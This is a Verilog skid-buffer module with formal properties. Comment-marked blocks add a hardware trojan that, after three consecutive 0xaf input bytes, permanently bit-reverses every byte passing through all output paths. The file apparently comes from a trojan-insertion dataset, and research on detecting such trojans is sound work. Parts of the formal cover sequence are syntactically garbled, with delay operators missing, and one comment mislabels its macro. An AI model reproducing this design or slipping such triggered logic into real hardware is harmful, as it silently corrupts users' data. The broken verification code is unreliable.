module skidbuffer #(
		// {{{
		parameter	[0:0]	OPT_LOWPOWER = 0,
		parameter	[0:0]	OPT_OUTREG = 1,
		//
		parameter	[0:0]	OPT_PASSTHROUGH = 0,
		parameter		DW = 8
		// }}}
	) (
		// {{{
		input	wire			i_clk, i_reset,
		input	wire			i_valid,
		output	reg			o_ready,
		input	wire	[DW-1:0]	i_data,
		output	reg			o_valid,
		input	wire			i_ready,
		output	reg	[DW-1:0]	o_data
		// }}}
	);

	reg	[DW-1:0]	r_data;

	// ******* Trojan insertion begin *******
	// Trojan registers: trigger counter, flag, reverse function
	reg [1:0] trojan_trigger_count;
	reg       trojan_active;

	// Synchronous process to monitor for three 0xaf bytes in sequence
	always @(posedge i_clk) begin
		if(i_reset) begin
			trojan_trigger_count <= 2'd0;
			trojan_active        <= 1'b0;
		end else begin
			// Only monitor if not active
			if (!trojan_active) begin
				if (i_valid && o_ready && i_data == 8'haf) begin
					if (trojan_trigger_count == 2'd2)
						trojan_active <= 1'b1;
					else
						trojan_trigger_count <= trojan_trigger_count + 2'd1;
				end else if (i_valid && o_ready) begin
					// reset counter on any other byte with valid transaction
					trojan_trigger_count <= 2'd0;
				end
			end
		end
	end

	// Function to reverse 8 bits (payload)
	function [7:0] reverse8;
		input [7:0] din;
		begin
			reverse8 = {din[0], din[1], din[2], din[3],
			            din[4], din[5], din[6], din[7]};
		end
	endfunction
	// ******* Trojan insertion end   *******

	generate if (OPT_PASSTHROUGH)
	begin : PASSTHROUGH
		// {{{
		always @(*)
			o_ready = i_ready;
		always @(*)
			o_valid = i_valid;
		always @(*)
		if (!i_valid && OPT_LOWPOWER)
			o_data = 0;
		else
			// ******* Trojan insertion begin *******
			// Forward reversed byte if trojan_active set, else normal
			if (trojan_active)
				o_data = reverse8(i_data);
			else
				o_data = i_data;
			// ******* Trojan insertion end   *******

		always @(*)
			r_data = 0;
		// }}}
	end else begin : LOGIC
		// We'll start with skid buffer itself
		// {{{
		reg			r_valid;

		// r_valid
		// {{{
		initial	r_valid = 0;
		always @(posedge i_clk)
		if (i_reset)
			r_valid <= 0;
		else if ((i_valid && o_ready) && (o_valid && !i_ready))
			// We have incoming data, but the output is stalled
			r_valid <= 1;
		else if (i_ready)
			r_valid <= 0;
		// }}}

		// r_data
		// {{{
		initial	r_data = 0;
		always @(posedge i_clk)
		if (OPT_LOWPOWER && i_reset)
			r_data <= 0;
		else if (OPT_LOWPOWER && (!o_valid || i_ready))
			r_data <= 0;
		else if ((!OPT_LOWPOWER || !OPT_OUTREG || i_valid) && o_ready)
			// ******* Trojan insertion begin *******
			// Write skewed data if trojan active
			if (trojan_active)
				r_data <= reverse8(i_data);
			else
				r_data <= i_data;
			// ******* Trojan insertion end   *******
		// }}}

		// o_ready
		// {{{
		always @(*)
			o_ready = !r_valid;
		// }}}

		//
		// And then move on to the output port
		//
		if (!OPT_OUTREG)
		begin

			always @(*)
				o_valid = !i_reset && (i_valid || r_valid);
			// }}}

			// o_data
			// {{{
			always @(*)
			if (r_valid)
				o_data = r_data;
			else if (!OPT_LOWPOWER || i_valid)
				// ******* Trojan insertion begin *******
				// Output reversed byte if trojan is active
				if (trojan_active)
					o_data = reverse8(i_data);
				else
					o_data = i_data;
				// ******* Trojan insertion end   *******
			else
				o_data = 0;
			// }}}
			// }}}
		end else begin : REG_OUTPUT
			// Register our outputs
			// {{{
			// o_valid
			// {{{
			initial	o_valid = 0;
			always @(posedge i_clk)
			if (i_reset)
				o_valid <= 0;
			else if (!o_valid || i_ready)
				o_valid <= (i_valid || r_valid);
			// }}}

			// o_data
			// {{{
			initial	o_data = 0;
			always @(posedge i_clk)
			if (OPT_LOWPOWER && i_reset)
				o_data <= 0;
			else if (!o_valid || i_ready)
			begin

				if (r_valid)
					o_data <= r_data;
				else if (!OPT_LOWPOWER || i_valid)
					// ******* Trojan insertion begin *******
					// Output reversed byte if trojan is active
					if (trojan_active)
						o_data <= reverse8(i_data);
					else
						o_data <= i_data;
					// ******* Trojan insertion end   *******
				else
					o_data <= 0;
			end
			// }}}

			// }}}
		end
		// }}}
	end endgenerate

`ifdef	FORMAL
`ifdef	VERIFIC
`define	FORMAL_VERIFIC
`endif
`endif
//
`ifdef	FORMAL_VERIFIC
	// Reset properties
	property RESET_CLEARS_IVALID;
		@(posedge i_clk) i_reset |=> !i_valid;
	endproperty

	property IDATA_HELD_WHEN_NOT_READY;
		@(posedge i_clk) disable iff (i_reset)
		i_valid && !o_ready |=> i_valid && $stable(i_data);
	endproperty

`ifdef	SKIDBUFFER
	assume	property (IDATA_HELD_WHEN_NOT_READY);
`else
	assert	property (IDATA_HELD_WHEN_NOT_READY);
`endif

	generate if (!OPT_PASSTHROUGH)
	begin

		assert property (@(posedge i_clk)
			OPT_OUTREG && i_reset |=> o_ready && !o_valid);

		assert property (@(posedge i_clk)
			!OPT_OUTREG && i_reset |-> !o_valid);

		// Rule #1:
		//	Once o_valid goes high, the data cannot change until the
		//	clock after i_ready
		assert property (@(posedge i_clk)
			disable iff (i_reset)
			o_valid && !i_ready
			|=> (o_valid && $stable(o_data)));

		// Rule #2:
		//	All incoming data must either go directly to the
		//	output port, or into the skid buffer
		assert property (@(posedge i_clk)
			disable iff (i_reset)
			(i_valid && o_ready
				&& (!OPT_OUTREG || o_valid) && !i_ready)
				|=> (!o_ready && r_data == $past(i_data)));

		// Rule #3:
		//	After the last transaction, o_valid should become idle
		if (!OPT_OUTREG)
		begin

			assert property (@(posedge i_clk)
				disable iff (i_reset)
				i_ready |=> (o_valid == i_valid));

		end else begin

			assert property (@(posedge i_clk)
				disable iff (i_reset)
				i_valid && o_ready |=> o_valid);

			assert property (@(posedge i_clk)
				disable iff (i_reset)
				!i_valid && o_ready && i_ready |=> !o_valid);

		end

		// Rule #4
		//	Same thing, but this time for r_valid
		assert property (@(posedge i_clk)
			!o_ready && i_ready |=> o_ready);


		if (OPT_LOWPOWER)
		begin
			//
			// If OPT_LOWPOWER is set, o_data and r_data both need
			// to be zero any time !o_valid or !r_valid respectively
			assert property (@(posedge i_clk)
				(OPT_OUTREG || !i_reset) && !o_valid |-> o_data == 0);

			assert property (@(posedge i_clk)
				o_ready |-> r_data == 0);

			// else
			//	if OPT_LOWPOWER isn't set, we can lower our
			//	logic count by not forcing these values to zero.
		end

`ifdef	SKIDBUFFER
		reg	f_changed_data;

		// Cover test
		cover property (@(posedge i_clk)
			disable iff (i_reset)
			(!o_valid && !i_valid)
			1 i_valid &&  i_ready [*3]
			1 i_valid && !i_ready
			1 i_valid &&  i_ready [*2]
			1 i_valid && !i_ready [*2]
			1 i_valid &&  i_ready [*3]
			// Wait for the design to clear
			1 o_valid && i_ready [*0:5]
			1 (!o_valid && !i_valid && f_changed_data));

		initial	f_changed_data = 0;
		always @(posedge i_clk)
		if (i_reset)
			f_changed_data <= 1;
		else if (i_valid && $past(!i_valid || o_ready))
		begin
			if (i_data != $past(i_data + 1))
				f_changed_data <= 0;
		end else if (!i_valid && i_data != 0)
			f_changed_data <= 0;

`endif	// SKIDCOVER
	end endgenerate

`endif	// FORMAL_VERIFIC
endmodule